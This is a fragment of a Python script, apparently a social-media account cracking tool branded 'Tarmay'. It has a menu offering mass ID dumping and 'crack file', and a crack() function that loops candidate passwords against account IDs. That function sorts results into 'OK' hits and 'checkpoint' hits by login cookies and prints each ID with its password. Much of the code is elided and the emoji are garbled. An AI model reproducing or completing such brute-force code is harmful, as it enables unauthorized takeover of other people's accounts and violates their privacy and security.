...
#	print('\033[1;32m[02] CRACK FILE \033[1;97m[\033[1;32mON\033[1;97m]')	
	...
	print('\033[1;97m____________________________')
	____TARMAYðŸ˜Ž____ = input('\nCHOICE : ')
	if ____TARMAY____ in ['1']:
		dump_massal()
	elif ____TARMAYðŸ˜Ž____ in ['2']:
		crack_file()
	elif ____TARMAYðŸ˜Ž____ in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \033[1;37m[\033[1;32mTarmayðŸ˜Ž\033[1;37m] {P}{H}{loop} {P} {H}{ok}/{M}{cp} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m [ðŸ†˜ Tarmay-CP â›”]\033[1;37m  {idf}\033[1;37m |\033[1;37m {pw}')
				...
				print(f'\r\033[1;34m [âž³ TARMAY-OKâœ” ]\033[1;34m  {idf} \033[1;34m| \033[1;34m{pw}')
